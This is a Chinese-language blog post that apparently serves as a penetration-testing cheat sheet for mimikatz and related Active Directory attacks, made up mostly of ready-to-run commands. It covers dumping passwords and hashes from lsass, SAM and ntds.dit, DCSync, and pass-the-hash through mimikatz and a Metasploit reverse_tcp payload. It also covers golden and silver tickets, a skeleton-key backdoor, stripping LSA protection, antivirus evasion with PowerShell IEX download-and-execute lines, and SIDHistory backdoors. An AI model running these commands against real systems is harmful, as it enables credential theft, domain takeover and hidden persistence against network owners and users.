---
title: mimikatz
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 45
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 攻防
  - 工具
categories:
  - 攻防
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

<!--more-->

项目地址：https://github.com/gentilkiwi/mimikatz/

![image-20240609102026356](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406091020515.webp)

# 一、工具简介
Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具。

Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接==从 lsass.exe 进程中获取当前登录系统用户名的密码==， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，==通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中==，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，==只限当前登陆系统==！

注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。

mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。

cmd修改注册表命令：

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
#重启或用户重新登录后可以成功抓取
```



# 二、Mimikatz命令

```php
cls：       清屏
standard：  标准模块，基本命令
crypto：    加密相关模块
sekurlsa：  与证书相关的模块
kerberos：  kerberos模块
privilege： 提权相关模块
process：   进程相关模块
serivce：   服务相关模块
lsadump：   LsaDump模块
ts：        终端服务器模块
event：     事件模块
misc：      杂项模块

token：     令牌操作模块 
    token::whoami：列出当前进程/线程的token信息
    token::list：列出当前系统中存在的token
    token::elevate：窃取其他用户的token
    token::run：利用某用户权限运行指定程序
    token::revert：恢复为原来的token
    
vault：     Windows 、证书模块
minesweeper：Mine Sweeper模块
net：
dpapi：     DPAPI模块（通过API或RAW访问）[数据保护应用程序编程接口]
busylight： BusyLight Module
sysenv：    系统环境值模块

sid：       安全标识符模块
   sid::patch对域控LDAP修改过程中的验证函数进行patch，需要在域控上执行，该功能没有参数
         patch共分为两个步骤，如果仅第一步patch成功的话，那么可以使用sid::add功能，两步都patch成功的话才可以使用sid::modify功能
   sid::lookup该功能实现SID与对象名之间的相互转换，有三个参数：
        /name：指定对象名，将其转换为SID
        /sid：指定SID，将其转换为对象名
        /system：指定查询的目标计算机
   sid::query该功能支持通过SID或对象名来查询对象的信息，同样有三个参数，使用时指定/sam或/sid，/system可选
        /sam：指定要查询对象的sAMAccountName
        /sid：指定要查询对象的objectSid
        /system：指定查询的目标域控（LDAP）
   sid::modify该功能用于修改一个域对象的SID，使用该功能是需要先使用sid::patch功能对xxxx进行patch（自然也需要先开启debug特权），需要在域控上执行。
        可以使用的参数有三个：
        /sam：通过sAMAccountName指定要修改SID的对象
        /sid：通过objectSid指定要修改SID的对象
        /new：要修改对象的新SID
   sid::add该功能用来向一个域对象添加sIDHistoy属性，有两个参数：
        /sam：通过sAMAccountName指定要修改的对象
        /sid：通过objectSid指定要修改的对象
        /new：要修改sIDHistory为哪个对象的SID，该参数可指定目标的sAMAccountName或objectSid，当指定名称时会先调用LookupAccountSid将其转换为SID
        使用该功能也要先执行sid::patch，修改时同样是操作LDAP通过ldap_modify_s()修改，不再赘述
   sid::clear该功能用来清空一个对象的sIDHistory属性
        /sam：要清空sIDHistory的对象的sAMAccountName
        /sid：要清空sIDHistory的对象的objectSid


iis：       IIS XML配置模块
rpc：       mimikatz的RPC控制
sr98：      用于SR98设备和T5577目标的RF模块
rdm：       RDM（830AL）器件的射频模块
acr：       ACR模块
version：   查看版本
exit：      退出
```





# 三、常见使用

九种姿势运行：Mimikatz：https://www.freebuf.com/articles/web/176796.html

借用PowerShell

```powershell
#读取密码明文(需要管理员权限)
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz –DumpCerts
#读取密码hash值(需要管理员权限)
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes
```

==mimikatz许多功能都需要管理员权限，如果不是管理员权限不能debug==

## 获取本地账户密码

### 本地执行

下载mimikatz程序，找到自己系统对应的位数，右键以管理员身份运行：

```makefile
log

#提升权限
privilege::debug

#抓取密码
sekurlsa::logonpasswords
```

当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。

cmd修改注册表命令：

```dockerfile
add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
#重启或用户重新登录后可以成功抓取
```



### SAM表获取hash

> SAM(安全账户管理器)，SAM是用来==存储Windows操作系统密码==的数据库文件，为了避免明文密码泄漏，SAM文件中保存的是明文密码经过一系列算法处理过的Hash值，被保存的Hash分为LM Hash、NTLMHash。在用户在本地或远程登陆系统时，会将Hash值与SAM文件中保存的Hash值进行对比。在后期的Windows系统中，SAM文件中被保存的密码Hash都被密钥SYSKEY加密。
>
> SAM文件在磁盘中的位置在C:\windows\system32\config\sam SAM文件在Windows系统启动后被系统锁定，无法进行移动和复制

```makefile
#导出SAM数据
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SAM SAM

#使用mimikatz提取hash
lsadump::sam /sam:SAM /system:SYSTEM
```



## procdump+mimikatz

当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:

```perl
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

将lsass.dmp下载到本地后，然后执行mimikatz:

```bash
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

为了方便复制与查看，可以输出到本地文件里面：

```bash
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" > pssword.txt
```



## 读取域控中域成员Hash

### 域控本地读取

注：得在域控上以域管理员身份执行mimikatz

方法一：直接执行

```makefile
#提升权限
privilege::debug

抓取密码
lsadump::lsa /patch
```

方法二：通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取：

> ntds.dit是AD中的数据库文件，它被保存在域控制器==c:\windows\system32\ntds\NTDS.DIT==位置。活动目录的数据库文件（ntds.dit）包含有关活动目录域中所有对象的所有信息，其中包含所有域用户和计算机帐户的密码哈希值。该文件在所有域控制器之间自动同步，它只能被域管理员访问和修改。

```bash
#获取所有域用户
lsadump::dcsync /domain:test.com /all /csv

#指定获取某个用户的hash
lsadump::dcsync /domain:test.com /user:test
```

### 导出域成员hash

域账户的用户名和hash密码以域数据库的形式存放在域控制器的 `%SystemRoot%\ntds\NTDS.DIT` 文件中。

这里可以借助：ntdsutil.exe，域控制器自带的域数据库管理工具，我们可以通过域数据库，提取出域中所有的域用户信息，在域控上依次执行如下命令，导出域数据库：

```powershell
#创建快照
ntdsutil snapshot "activate instance ntds" create quit quit

#加载快照
ntdsutil snapshot "mount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit

#Copy文件副本
copy C:\$SNAP_201911211122_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit
```

将ntds.dit文件拷贝到本地利用impacket脚本dump出Hash：

```sql
secretsdump.py -ntds.dit -system system.hive LOCAL
```

<img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192346778.webp" alt="image-20231019234612484" style="zoom:67%;" />

除了借助python，还有一个NTDSDumpEx（会被360查杀的哦）：

工具地址：https://github.com/zcgonvh/NTDSDumpEx/releases

```scss
CopyNTDSDumpEx -d ntds.dit -o domain.txt -s system.hiv    (system.hive文件获取:reg save hklm\system system.hive)
NTDSDumpEx -d ntds.dit -o domain.txt -r               (此命令适用于在域控本地执行)
```

![image-20231019234754131](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192347334.webp)

![image-20231019234804715](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192348826.webp)

最后记得卸载删除快照：

```bash
Copyntdsutil snapshot "unmount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit
ntdsutil snapshot "delete  {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit
```



### secretsdump脚本直接导出域hash

为什么要再提一遍secretsdump呢，因为它可以直接导出，说白了，简单粗暴：

```perl
python secretsdump.py rabbitmask:123456@192.168.15.181
```

首先它会导出本地SAM中的hash，然后是所有域内用户的IP，全部获取成功





## 哈希传递攻击PTH

https://zhuanlan.zhihu.com/p/472019671

> 哈希传递(pth)攻击是指攻击者可以通过捕获密码的hash值(对应着密码的值),然后简单地将其传递来进行身份验证，以此来横向访问其他网络系统。 攻击者无须通过解密hash值来获取明文密码。因为对于每个Session hash值都是固定的，除非密码被修改了(需要刷新缓存才能生效)，所以pth可以利用身份验证协议来进行攻击。 攻击者通常通过抓取系统的活动内存和其他技术来获取哈希。
>
> 虽然哈希传递攻击可以在Linux,Unix和其他平台上发生,但它们在windows系统上最普遍。 在Windows中，pth通过NT Lan Manager(NTLM)，Kereros和其他身份验证协议来进行单点登录。在Windows中创建密码后，密码经过哈希化处理后存储在安全账户管理器(SAM)，本地安全机构子系统(LSASS)进程内存，凭据管理器(CredMan),Active Directory中的ntds.dit数据库或者其他地方。因此，当用户登录windows工作站或服务器时，他们实际上会留下密码凭据(hash)。

### 工作组环境

当我们获得了一台主机的NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。

```bash
#使用administrator用户的NTLM哈希值进行攻击
sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9
#使用xie用户的NTLM哈希值进行攻击
sekurlsa::pth /user:xie /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9
```

在弹出的cmd窗口，我们直接可以连接该主机，并且查看该主机下的文件夹。

![image-20231019234900213](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192349390.webp)

或者可以直接将该主机的C盘映射到本地的K盘。

![image-20231019234915419](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192349585.webp)

注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令。

### 域环境

在域环境中，当我们获得了域内用户的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机的本地 administrator 权限和获得了域用户的NTLM哈希值

域：xie.com

域控：WIN2008.xie.com

```bash
Copy#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击
sekurlsa::pth /user:administrator /domain:"xie.com" /ntlm:dbd621b8ed24eb627d32514476fac6c5 
Copy#使用域用户xie的NTLM哈希值对域控进行哈希传递攻击
sekurlsa::pth /user:xie /domain:"xie.com" /ntlm:329153f560eb329c0e1deea55e88a1e9   
```

![image-20231019234949268](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192349442.webp)

![image-20231019235002695](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192350903.webp)

### MSF进行哈希传递

有些时候，当我们获取到了某台主机的Administrator用户的LM-Hash和 NTLM-Hash ，并且该主机的445端口打开着。我们则可以利用 `exploit/windows/smb/psexec` 漏洞用MSF进行远程登录(哈希传递攻击)。(只能是administrator用户的LM-hash和NTLM-hash)，这个利用跟工作组环境或者域环境无关。

```bash
Copymsf > use  exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set lhost 192.168.10.27
msf exploit(psexec) > set rhost 192.168.10.14
msf exploit(psexec) > set smbuser Administrator
msf exploit(psexec) > set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6   #这里LM和NTLM我们已经获取到了
msf exploit(psexec) > exploit 
```

![image-20231019235026440](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192350727.webp)

## 票据传递攻击PTT

### 黄金票据

域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。

首先获取krbtgt的用户hash:

```bash
Copymimikatz "lsadump::dcsync /domain:xx.com /user:krbtgt"
```

利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：

```bash
Copykerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi
Copy#导入刚才生成的票据
kerberos::ptt test.kiribi

#导入成功后可获取域管权限
dir \\dc.abc.com\c$
```

### 白银票据

黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信

白银票据：伪造 TGS ，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信

```bash
Copy#在域控上导出 DC$ 的 HASH
mimikatz log "privilege::debug" "sekurlsa::logonpasswords"

#利用 DC$ 的 Hash制作一张 cifs 服务的白银票据
kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt

#cifs是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统
dir \\DC.ABC.COM\C$
```

### skeleton key

skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。

```php
Copy#在域控上安装 skeleton key
mimikatz.exe privilege::debug "misc::skeleton"

#在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatz
net use \\WIN-9P499QKTLDO.adtest.com\c$ mimikatz /user:adtest\administrator
```

微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。

![img](http://www.0-sec.org/%E5%9F%9F%E6%B8%97%E9%80%8F/img/70.png)

```yaml
Copy#适用系统
windows 8.1
windows server 2012 及以上
```

当然 mimikatz 依旧可以绕过，该功能需要导入mimidrv.sys文件，导入命令如下:

```bash
Copyprivilege::debug
!+
!processprotect /process:lsass.exe /remove 
misc::skeleton
```

### MS14-068

当我们拿到了一个普通域成员的账号后，想继续对该域进行渗透，拿到域控服务器权限。如果域控服务器存在 MS14_068 漏洞，并且未打补丁，那么我们就可以利用 MS14_068 快速获得域控服务器权限。

MS14-068编号 CVE-2014-6324，补丁为 3011780 ，如果自检可在域控制器上使用命令检测。

```bash
Copysysteminfo |find "3011780"
#为空说明该服务器存在MS14-068漏洞
```

操作链接：MS14-068复现(CVE-2014-6324)：https://www.cnblogs.com/-mo-/p/11890539.html





## 其他

### 导出chrome中的密码

详情请见：https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd



### 隐藏功能

管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：

```cpp
Copyprivilege::debug
misc::cmd
misc::regedit
misc::taskmgr
```

### 免杀

Powersploit中提供的很多工具都是做过加密处理的，同时也提供了一些用来加密处理的脚本，Out-EncryptedScript就是其中之一。

首先在本地对Invoke-Mimikatz.ps1进行加密处理：

```powershell
Copypoweshell.exe Import-Module .\Out-EncryptedScript.ps1
poweshell.exe Out-EncryptedScript -ScriptPath .\Invoke-Mimikatz.ps1 -Password 密码 -Salt 随机数
#默认生成的文件是evil.ps1

-Password   设置加密的密钥
-Salt       随机数，防止被暴力破解
```

将加密生成的evil.sp1脚本放在目标机上，执行如下命令：

```powershell
Copy#远程加载解密脚本
poweshell.exe 
IEX(New-Object Net.WebClient).DownloadString("http://1.1.1.32/PowerSploit/ScriptModification/Out-EncryptedScript.ps1")

[String] $cmd = Get-Content .\evil.ps1
Invoke-Expression $cmd
$decrypted = de password salt
Invoke-Expression $decrypted
Invoke-Mimikatz
```

![image-20231019235230924](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192352079.webp)



 



# 四、模块

## SID

在渗透测试中的利用，一个是使用SIDHistory属性来留后门，另一个是修改域对象的SID来实现域内的“影子账户”或者跨域等操作

**1. SIDHistoy后门**

拿下域控后，我们将普通域用户test1的sIDHistory属性设置为域管的SID：

![image-20240609104342696](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406091043802.webp)

此时test1将具有域管权限，我们可以利用这个特性来留后门

**2.域内“影子账户”**

假设我们此时拿到了域控，然后设置一个普通域用户的SID为域管的SID

此时我们这个用户仍然只是Domain Users组中的普通域成员

但该用户此时已经具有了域管的权限，例如dcsync

**3.跨域**

通常我们拿到一个域林下的一个子域，会通过黄金票据+SIDHistory的方式获取企业管理员权限，控制整个域林

除了这种方法，我们也可以直接修改当前子域对象的sIDHistory属性，假设我们现在拿到一个子域域控，通过信任关系发现存在一个父域，此时我们无法访问父域域控的CIFS

![image-20240609104651568](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406091046698.webp)

但我们给子域域管的sIDHistory属性设置为父域域管的SID

![image-20240609104705179](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406091047306.webp)

此时就可以访问父域域控的CIFS了

![image-20240609104720032](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406091047176.webp)

























